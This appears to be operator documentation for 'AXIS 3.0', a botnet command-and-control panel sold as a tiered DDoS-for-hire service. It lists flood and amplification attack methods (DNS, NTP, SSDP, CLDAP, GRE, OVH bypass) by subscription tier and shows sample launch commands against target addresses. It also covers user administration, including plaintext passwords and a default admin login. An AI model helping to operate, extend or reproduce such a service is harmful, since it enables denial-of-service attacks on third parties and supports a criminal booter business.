# AXIS 3.0 - JSON Database System

## Overview

AXIS 3.0 now uses a **JSON-based file database** (`database.json`) instead of MySQL/MariaDB. All user data, attack history, login logs, and whitelist settings are stored in a single JSON file.

---

## Database File Location

```
cnc/database.json
```

The database is automatically created on first run with a default admin user.

---

## Account Tiers

### **Basic Tier**
- **Max Attack Duration**: 120 seconds
- **Max Bots**: 100 (configurable)
- **Available Attack Methods**:
  - `tcp` - TCP flood
  - `udp` - UDP flood
  - `icmp` - ICMP flood
  - `http` - HTTP flood

### **Premium Tier**
- **Max Attack Duration**: 180 seconds
- **Max Bots**: 500 (configurable)
- **Available Attack Methods**:
  - All Basic methods
  - `ovhtcp` - OVH TCP bypass
  - `ovhudp` - OVH UDP bypass
  - `dns-amp` - DNS amplification

### **VIP Tier**
- **Max Attack Duration**: 600 seconds (10 minutes)
- **Max Bots**: Unlimited (-1)
- **Available Attack Methods**:
  - All Premium methods
  - `ntp-amp` - NTP amplification
  - `ssdp-amp` - SSDP amplification
  - `snmp-amp` - SNMP amplification
  - `cldap-amp` - CLDAP amplification
  - `greip` - GRE IP flood
  - `greeth` - GRE Ethernet flood
  - `axis-tcp` - AXIS TCP combined
  - `axis-udp` - AXIS UDP combined
  - `axis-l7` - AXIS Layer 7

### **Admin Tier**
- **Max Attack Duration**: Unlimited (-1)
- **Max Bots**: Unlimited (-1)
- **Available Attack Methods**: All methods
- **Special Permissions**: User management, tier upgrades

---

## Default Admin Account

```json
{
  "username": "admin",
  "password": "admin123",
  "tier": "admin",
  "api_key": "AXIS3-ADMIN-APIKEY"
}
```

**⚠️ IMPORTANT**: Change the default admin password immediately!

---

## Admin Commands

### User Management

**Create User with Tier Selection:**
```
adduser
```
Prompts:
1. Username
2. Password
3. Tier (basic/premium/vip/admin)
4. Custom botcount (optional for basic/premium)
5. Cooldown (0 for no cooldown)

**Upgrade User Tier:**
```
upgradeuser
```
Prompts:
1. Username to upgrade
2. New tier (basic/premium/vip/admin)

**Remove User:**
```
deluser
```
Prompts:
1. Username to remove

**List All Users:**
```
listusers
```
Displays all users with their tiers and API keys in a formatted table.

---

## Database Structure

```json
{
  "users": [
    {
      "username": "admin",
      "password": "admin123",
      "tier": "admin",
      "api_key": "AXIS3-ADMIN-APIKEY",
      "created_at": 1710000000,
      "last_login": 0,
      "last_paid": 1710000000,
      "interval": 0,
      "cooldown": 0,
      "wrc": 0
    }
  ],
  "history": [],
  "logins": [],
  "whitelist": [
    {"prefix": "10.0.0.0", "netmask": "8"},
    {"prefix": "172.16.0.0", "netmask": "12"},
    {"prefix": "192.168.0.0", "netmask": "16"},
    {"prefix": "127.0.0.0", "netmask": "8"}
  ],
  "online": []
}
```

---

## User Fields

| Field | Type | Description |
|-------|------|-------------|
| `username` | string | Unique username |
| `password` | string | User password (plaintext) |
| `tier` | string | Account tier (basic/premium/vip/admin) |
| `api_key` | string | API authentication key |
| `created_at` | int64 | Unix timestamp of account creation |
| `last_login` | int64 | Unix timestamp of last login |
| `last_paid` | int64 | Unix timestamp for subscription expiry |
| `interval` | int | Days until subscription expires (0 = permanent) |
| `cooldown` | int | Cooldown between attacks (seconds) |
| `wrc` | int | Account status (0 = active, 1 = suspended) |

---

## Automatic Features

### Account Expiry
- Non-admin accounts expire after `interval` days
- Set `interval: 0` for permanent accounts
- Expired accounts cannot login

### Login Logging
- All login attempts are logged to `database.json`
- Includes: username, action (Login/Fail/Logout), IP, timestamp
- Keeps last 1000 login records

### Attack History
- All attacks are logged to `database.json`
- Includes: username, command, duration, max_bots, timestamp
- Keeps last 1000 attack records

### Cooldown Enforcement
- Users must wait `cooldown` seconds between attacks
- Admin accounts have no cooldown by default

---

## Backup & Restore

### Backup Database
```bash
cp cnc/database.json cnc/database.backup.json
```

### Restore Database
```bash
cp cnc/database.backup.json cnc/database.json
```

### Manual User Creation
Edit `database.json` directly:
```json
{
  "users": [
    {
      "username": "newuser",
      "password": "password123",
      "tier": "premium",
      "api_key": "AXIS3-NEWUSER-1234567890",
      "created_at": 1710000000,
      "last_login": 0,
      "last_paid": 1710000000,
      "interval": 30,
      "cooldown": 30,
      "wrc": 0
    }
  ]
}
```

---

## Tier Upgrade Examples

**Basic → Premium:**
```
admin> upgradeuser
Username to upgrade: testuser
New tier (basic/premium/vip/admin): premium
User testuser upgraded to premium tier!
```

**Premium → VIP:**
```
admin> upgradeuser
Username to upgrade: testuser
New tier (basic/premium/vip/admin): vip
User testuser upgraded to vip tier!
```

**Any → Admin:**
```
admin> upgradeuser
Username to upgrade: trusteduser
New tier (basic/premium/vip/admin): admin
User trusteduser upgraded to admin tier!
```

---

## Attack Method Restrictions

### Basic User Attempting Premium Method
```
user> !ovhtcp 1.2.3.4 60 dport=80
Error: Attack method not available for your tier
```

### Basic User Exceeding Duration
```
user> !tcp 1.2.3.4 180 dport=80
Error: Attack duration exceeds your limit (120 seconds)
```

### VIP User (Unlimited)
```
vip> !axis-tcp 1.2.3.4 600 tcpport=80
Attack launched successfully!
```

---

## Security Notes

1. **File Permissions**: Ensure `database.json` has restricted permissions (0600)
2. **Backup Regularly**: Create backups before making changes
3. **Change Defaults**: Change admin password immediately
4. **Monitor Logs**: Check login logs for suspicious activity
5. **API Key Security**: Keep API keys confidential

---

## Migration from MySQL

If migrating from MySQL database:

1. **Export MySQL users** (manual process required)
2. **Create database.json** with user data
3. **Update passwords** (MySQL passwords are hashed, JSON uses plaintext)
4. **Test login** with each account
5. **Verify whitelists** are transferred

**Note**: There is no automatic migration tool. Manual recreation of users is required.

---

## Troubleshooting

### Database File Corrupted
```bash
# Restore from backup
cp cnc/database.backup.json cnc/database.json

# Or recreate with default admin
rm cnc/database.json
# Restart C&C server - will create new database.json
```

### User Cannot Login
1. Check `wrc` field (0 = active, 1 = suspended)
2. Check `last_paid` + `interval` (account may be expired)
3. Verify password is correct

### Attack Method Not Available
- Check user's tier permissions
- Verify attack method name matches tier config
- Upgrade user tier if needed

---

## Performance Notes

- JSON database is suitable for **small to medium** botnets (< 1000 users)
- For larger deployments, consider MySQL migration
- Database is loaded into memory on startup
- Changes are saved after each write operation
- File size typically remains < 1MB for most deployments

---

**AXIS 3.0 - JSON Database System**  
*Simple, portable, file-based user management*
